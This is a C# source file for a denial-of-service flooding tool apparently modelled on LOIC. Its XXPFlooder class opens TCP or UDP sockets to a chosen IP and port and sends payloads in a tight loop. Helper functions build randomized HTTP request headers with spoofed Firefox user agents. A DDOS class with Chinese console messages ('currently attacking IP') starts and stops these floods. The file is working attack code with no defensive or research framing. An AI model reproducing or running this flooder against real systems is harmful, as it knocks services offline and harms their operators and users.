using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.ComponentModel;

namespace CSharPDdos
{
    public enum ReqState
    {
        Ready,
        Connecting,
        Requesting,
        Downloading,
        Completed,
        Failed
    };
    public enum Protocol
    {
        None = 0,
        TCP = 1,
        UDP = 2,
        HTTP = 3,
        slowLOIC = 4,
        ReCoil = 5,
        ICMP = 6,
    }
    interface IFlooder
    {
        #region Properties
        int Delay { get; set; }
        bool IsFlooding { get; set; }
        #endregion

        #region Methods
        void Start();
        void Stop();
        #endregion
    }

    public abstract class cHLDos : IFlooder
    {
        public ReqState State = ReqState.Ready;
        public bool IsDelayed { get; set; }
        public bool IsFlooding { get; set; }
        public int Requested { get; set; }
        public int Downloaded { get; set; }
        public int Failed { get; set; }
        public int Delay { get; set; }
        public int Timeout { get; set; }

        public virtual void Start()
        { }

        public virtual void Stop()
        {
            IsFlooding = false;
            IsDelayed = true;
        }
        public virtual bool Test()
        {
            return true;
        }
    }
    public static class Functions
    {
        private static readonly Random rnd = new Random(Guid.NewGuid().GetHashCode());
        private static readonly String[] ntv = { "6.0", "6.1", "6.2", "6.3", "10.0" };

        public static string RandomString(int length = 6)
        {
            StringBuilder builder = new StringBuilder();

            lock (rnd)
            {
                char ch;
                for (int i = 0; i < length; i++)
                {
                    ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * rnd.NextDouble() + 65)));
                    builder.Append(ch);
                }
            }

            return builder.ToString();
        }

        public static int RandomInt(int min, int max)
        {
            lock (rnd)
            {
                return rnd.Next(min, max);
            }
        }

        public static string RandomUserAgent()
        {
            lock (rnd)
            {
                if (rnd.NextDouble() >= 0.5)
                {
                    return String.Format("Mozilla/5.0 (Windows NT {0}; WOW64; rv:{1}.0) Gecko/20100101 Firefox/{1}.0", ntv[rnd.Next(ntv.Length)], rnd.Next(36, 47));
                }
                else
                {
                    return String.Format("Mozilla/5.0 (Windows NT {0}; rv:{1}.0) Gecko/20100101 Firefox/{1}.0", ntv[rnd.Next(ntv.Length)], rnd.Next(36, 47));
                }
            }
        }

        public static object RandomElement(object[] array)
        {
            if (array == null || array.Length < 1)
                return null;

            if (array.Length == 1)
                return array[0];

            lock (rnd)
            {
                return array[rnd.Next(array.Length)];
            }
        }

        public static byte[] RandomHttpHeader(string method, string subsite, string host, bool subsite_random = false, bool gzip = false, int keep_alive = 0)
        {
            return Encoding.ASCII.GetBytes(String.Format("{0} {1}{2} HTTP/1.1{7}Host: {3}{7}User-Agent: {4}{7}Accept: */*{7}{5}{6}{7}", method, subsite, (subsite_random ? RandomString() : ""), host, RandomUserAgent(), (gzip ? "Accept-Encoding: gzip, deflate\r\n" : ""), (keep_alive > 0 ? String.Format("Keep-Alive: {0}\r\nConnection: keep-alive\r\n", keep_alive) : ""), "\r\n"));
        }

        public static bool ParseInt(string str, int min, int max, out int value)
        {
            bool res = int.TryParse(str, out value);

            if (res && value >= min && value <= max)
                return true;

            return false;
        }
    }
    public class XXPFlooder : cHLDos
    {
        private BackgroundWorker bw;

        private readonly string IP;
        private readonly int Port;
        private readonly int Protocol;
        private readonly bool Resp;
        private readonly string Data;
        private readonly bool AllowRandom;

        public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
        {
            this.IP = ip;
            this.Port = port;
            this.Protocol = proto;
            this.Delay = delay;
            this.Resp = resp;
            this.Data = data;
            this.AllowRandom = random;
            this.Requested = 0;
            this.Failed = 0;
        }
        public override void Start()
        {
            this.IsFlooding = true;
            this.bw = new BackgroundWorker();
            this.bw.DoWork += bw_DoWork;
            this.bw.RunWorkerAsync();
            this.bw.WorkerSupportsCancellation = true;
        }
        public override void Stop()
        {
            this.IsFlooding = false;
            this.bw.CancelAsync();
        }
        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
                while (this.IsFlooding)
                {
                    State = ReqState.Ready; // SET STATE TO READY //
                    if (Protocol == (int)CSharPDdos.Protocol.TCP)
                    {
                        using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                        {
                            socket.NoDelay = true;
                            State = ReqState.Connecting; // SET STATE TO CONNECTING //

                            try { socket.Connect(RHost); }
                            catch { continue; }

                            socket.Blocking = Resp;
                            State = ReqState.Requesting; // SET STATE TO REQUESTING //

                            try
                            {
                                while (this.IsFlooding)
                                {
                                    Requested++;
                                    byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
                                    socket.Send(buf);
                                    if (Delay >= 0)
                                        System.Threading.Thread.Sleep(Delay + 1);

                                }
                            }
                            catch { Failed++; }
                        }
                    }
                    if (Protocol == (int)CSharPDdos.Protocol.UDP)
                    {
                        using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
                        {
                            socket.Blocking = Resp;
                            State = ReqState.Requesting; // SET STATE TO REQUESTING //

                            try
                            {
                                while (this.IsFlooding)
                                {
                                    Requested++;
                                    byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
                                    socket.SendTo(buf, SocketFlags.None, RHost);
                                    if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
                                }
                            }
                            catch { Failed++; }
                        }
                    }
                }
            }
            // Analysis disable once EmptyGeneralCatchClause
            catch { }
            finally { State = ReqState.Ready; this.IsFlooding = false; }
        }
    }

    public class DDOS
    {
        public string m_IP
        {
            get;
            set;
        }
        public int m_Port
        {
            get;
            set;
        }

        private List<IFlooder> arr = new List<IFlooder>(); //接口列表
        public void Set_m_IP(string IP)
        {
            m_IP = IP;
        }
        public void Set_m_Port(int Port)
        {
            m_Port = Port;
        }
        public string Get_m_IP()
        {
            return m_IP;
        }
        public int Get_m_Port()
        {
            return m_Port;
        }

        public void Init_DDos(string IP, int Port)
        {
            Console.WriteLine("当前攻击的IP是 " + IP);
            Console.WriteLine("端口是 " + Port);

            m_IP = IP;
            m_Port = Port;

            Console.WriteLine("初始化_当前攻击的IP是 " + m_IP);
            Console.WriteLine("初始化_端口是 " + m_Port);
        }
        public void Init_DDos(int _IP0,int _IP1,int _IP2,int _IP3, int Port)
        {

            m_IP += _IP0;
            m_IP += ".";
            m_IP += _IP1;
            m_IP += ".";
            m_IP += _IP2;
            m_IP += ".";
            m_IP += _IP3;

            m_Port = Port;

            Console.WriteLine("初始化_当前攻击的IP是 " + m_IP);
            Console.WriteLine("初始化_端口是 " + m_Port);
        }
        public void Init_DDos()
        {
            Console.WriteLine("初始化_当前攻击的IP是 " + m_IP);
            Console.WriteLine("初始化_端口是 " + m_Port);
        }

        public int Start_TCP_DDos()
        {
            Console.WriteLine("攻击中");
            IFlooder ts = new XXPFlooder(m_IP, m_Port, 1, 0, false, "U dun goofed", false);

            ts.Start();
            arr.Add(ts);

            return 0;
        }

        public void Stop_TCP_DDos()
        {
            foreach (IFlooder i in arr)
            {
                i.Stop();
                i.IsFlooding = false;
            }
        }

    }
}
